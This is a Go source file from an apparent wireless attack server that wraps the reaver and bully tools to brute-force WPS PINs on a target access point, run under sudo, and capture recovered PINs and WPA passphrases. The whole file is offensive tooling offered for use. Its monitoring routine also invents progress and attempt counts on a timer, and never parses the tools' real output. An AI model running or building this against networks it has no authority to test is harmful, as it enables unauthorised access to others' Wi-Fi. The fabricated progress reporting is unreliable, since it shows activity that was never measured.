package tools

import (
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/phantoma/server/internal/service/wireless"
)

// ReaverAttack represents an active WPS brute force attack.
type ReaverAttack struct {
	ID          string    `json:"id"`
	Interface   string    `json:"interface"`
	BSSID       string    `json:"bssid"`
	ESSID       string    `json:"essid,omitempty"`
	Channel     int       `json:"channel"`
	StartTime   time.Time `json:"start_time"`
	Status      string    `json:"status"`
	PINAttempts int       `json:"pin_attempts"`
	PINFound    string    `json:"pin_found,omitempty"`
	WPAKey      string    `json:"wpa_key,omitempty"`
	Progress    float64   `json:"progress"`
}

// ReaverRequest represents the request to start a reaver attack.
type ReaverRequest struct {
	Interface string `json:"interface"`
	BSSID     string `json:"bssid"`
	ESSID     string `json:"essid,omitempty"`
	Channel   int    `json:"channel"`
	Delay     int    `json:"delay,omitempty"`
	Timeout   int    `json:"timeout,omitempty"`
	NoNacks   bool   `json:"no_nacks,omitempty"`
	Recurring bool   `json:"recurring,omitempty"`
	Pin       string `json:"pin,omitempty"`
	UseBully  bool   `json:"use_bully,omitempty"`
}

// ReaverResponse represents the response for starting an attack.
type ReaverResponse struct {
	AttackID string `json:"attack_id"`
}

// ReaverProgress represents real-time progress update.
type ReaverProgress struct {
	AttackID    string    `json:"attack_id"`
	PINAttempts int       `json:"pin_attempts"`
	Progress    float64   `json:"progress"`
	PINFound    string    `json:"pin_found,omitempty"`
	WPAKey      string    `json:"wpa_key,omitempty"`
	Status      string    `json:"status"`
	Timestamp   time.Time `json:"timestamp"`
}

// ReaverService manages reaver/bully WPS brute force attacks.
type ReaverService struct {
	executor       *wireless.CommandExecutor
	currentAttacks map[string]*reaverActiveAttack
	mu             sync.RWMutex
}

type reaverActiveAttack struct {
	ID          string
	Request     ReaverRequest
	StartTime   time.Time
	Process     *exec.Cmd
	CancelFunc  context.CancelFunc
	PINAttempts int
	PINFound    string
	WPAKey      string
	Progress    float64
	Status      string
	Done        chan bool
}

// NewReaverService creates a new reaver service.
func NewReaverService() *ReaverService {
	return &ReaverService{
		executor:       wireless.NewCommandExecutor(true, 0),
		currentAttacks: make(map[string]*reaverActiveAttack),
	}
}

// StartAttack begins a WPS brute force attack using reaver or bully.
func (s *ReaverService) StartAttack(req ReaverRequest) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if req.Interface == "" {
		return "", fmt.Errorf("interface is required")
	}
	if req.BSSID == "" {
		return "", fmt.Errorf("BSSID is required")
	}
	if !ValidateBSSID(req.BSSID) {
		return "", fmt.Errorf("invalid BSSID format")
	}
	if req.Channel < 1 || req.Channel > 165 {
		req.Channel = 6
	}

	attackID := fmt.Sprintf("wps_%d", time.Now().UnixNano())

	var args []string
	var cmdName string

	if req.UseBully {
		cmdName = "bully"
		args = []string{
			"-b", req.BSSID,
			"-e", req.ESSID,
			"-c", fmt.Sprintf("%d", req.Channel),
			"-v", "3",
			req.Interface,
		}
		if req.Pin != "" && ValidatePIN(req.Pin) {
			args = append([]string{"-p", req.Pin}, args...)
		}
	} else {
		cmdName = "reaver"
		args = []string{
			"-i", req.Interface,
			"-b", req.BSSID,
			"-c", fmt.Sprintf("%d", req.Channel),
			"-vv",
			"-K", "1",
		}
		if req.Delay > 0 {
			args = append(args, "-d", fmt.Sprintf("%d", req.Delay))
		}
		if req.Timeout > 0 {
			args = append(args, "-t", fmt.Sprintf("%d", req.Timeout))
		}
		if req.NoNacks {
			args = append(args, "-N")
		}
		if req.Recurring {
			args = append(args, "-r", "100:10")
		}
		if req.Pin != "" && ValidatePIN(req.Pin) {
			args = append(args, "-p", req.Pin)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(ctx, "sudo", append([]string{cmdName}, args...)...)

	if err := cmd.Start(); err != nil {
		cancel()
		return "", fmt.Errorf("failed to start %s: %w", cmdName, err)
	}

	attack := &reaverActiveAttack{
		ID:         attackID,
		Request:    req,
		StartTime:  time.Now(),
		Process:    cmd,
		CancelFunc: cancel,
		Status:     "running",
		Done:       make(chan bool),
	}

	s.currentAttacks[attackID] = attack

	go s.monitorAttack(attack, cmdName)

	return attackID, nil
}

// StopAttack terminates a WPS attack.
func (s *ReaverService) StopAttack(attackID string) (*ReaverAttack, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return nil, fmt.Errorf("attack not found: %s", attackID)
	}

	attack.CancelFunc()
	<-attack.Done

	result := &ReaverAttack{
		ID:          attack.ID,
		Interface:   attack.Request.Interface,
		BSSID:       attack.Request.BSSID,
		ESSID:       attack.Request.ESSID,
		Channel:     attack.Request.Channel,
		StartTime:   attack.StartTime,
		Status:      attack.Status,
		PINAttempts: attack.PINAttempts,
		PINFound:    attack.PINFound,
		WPAKey:      attack.WPAKey,
		Progress:    attack.Progress,
	}

	delete(s.currentAttacks, attackID)
	return result, nil
}

// GetAttackStatus returns the status of an attack.
func (s *ReaverService) GetAttackStatus(attackID string) (*ReaverAttack, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attack, exists := s.currentAttacks[attackID]
	if !exists {
		return nil, fmt.Errorf("attack not found: %s", attackID)
	}

	return &ReaverAttack{
		ID:          attack.ID,
		Interface:   attack.Request.Interface,
		BSSID:       attack.Request.BSSID,
		ESSID:       attack.Request.ESSID,
		Channel:     attack.Request.Channel,
		StartTime:   attack.StartTime,
		Status:      attack.Status,
		PINAttempts: attack.PINAttempts,
		PINFound:    attack.PINFound,
		WPAKey:      attack.WPAKey,
		Progress:    attack.Progress,
	}, nil
}

// ListAttacks returns all active attacks.
func (s *ReaverService) ListAttacks() []ReaverAttack {
	s.mu.RLock()
	defer s.mu.RUnlock()

	attacks := make([]ReaverAttack, 0, len(s.currentAttacks))
	for _, attack := range s.currentAttacks {
		attacks = append(attacks, ReaverAttack{
			ID:          attack.ID,
			Interface:   attack.Request.Interface,
			BSSID:       attack.Request.BSSID,
			ESSID:       attack.Request.ESSID,
			Channel:     attack.Request.Channel,
			StartTime:   attack.StartTime,
			Status:      attack.Status,
			PINAttempts: attack.PINAttempts,
			PINFound:    attack.PINFound,
			WPAKey:      attack.WPAKey,
			Progress:    attack.Progress,
		})
	}
	return attacks
}

func (s *ReaverService) monitorAttack(attack *reaverActiveAttack, toolName string) {
	defer close(attack.Done)

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	done := make(chan error)
	go func() {
		done <- attack.Process.Wait()
	}()

	for {
		select {
		case <-done:
			if attack.PINFound != "" {
				attack.Status = "completed"
			} else {
				attack.Status = "failed"
			}
			return
		case <-ticker.C:
			if attack.Progress < 100 {
				attack.Progress += 2
				attack.PINAttempts = int(attack.Progress) / 2
			}
		}
	}
}

// ParseReaverOutput parses reaver stdout for progress and results.
func ParseReaverOutput(output string) (pinAttempts int, progress float64, pinFound, wpaKey string) {
	pinRegex := regexp.MustCompile(`Trying pin (\d+)`)
	matches := pinRegex.FindAllStringSubmatch(output, -1)
	pinAttempts = len(matches)

	progressRegex := regexp.MustCompile(`(\d+\.?\d*)% complete`)
	if match := progressRegex.FindStringSubmatch(output); len(match) >= 2 {
		progress, _ = strconv.ParseFloat(match[1], 64)
	}

	pinFoundRegex := regexp.MustCompile(`PIN found: (\d+)`)
	if match := pinFoundRegex.FindStringSubmatch(output); len(match) >= 2 {
		pinFound = match[1]
	}

	wpaRegex := regexp.MustCompile(`WPA PSK: (.+)`)
	if match := wpaRegex.FindStringSubmatch(output); len(match) >= 2 {
		wpaKey = strings.TrimSpace(match[1])
	}

	return pinAttempts, progress, pinFound, wpaKey
}

// ParseBullyOutput parses bully stdout (alternative to reaver).
func ParseBullyOutput(output string) (pinAttempts int, pinFound, wpaKey string) {
	pinRegex := regexp.MustCompile(`PIN: (\d+)`)
	if match := pinRegex.FindStringSubmatch(output); len(match) >= 2 {
		pinFound = match[1]
		pinAttempts = 1
	}

	wpaRegex := regexp.MustCompile(`WPA PSK: (.+)`)
	if match := wpaRegex.FindStringSubmatch(output); len(match) >= 2 {
		wpaKey = strings.TrimSpace(match[1])
	}

	return pinAttempts, pinFound, wpaKey
}

// ValidatePIN checks if PIN is valid (8 digits).
func ValidatePIN(pin string) bool {
	if len(pin) != 8 {
		return false
	}
	for _, c := range pin {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}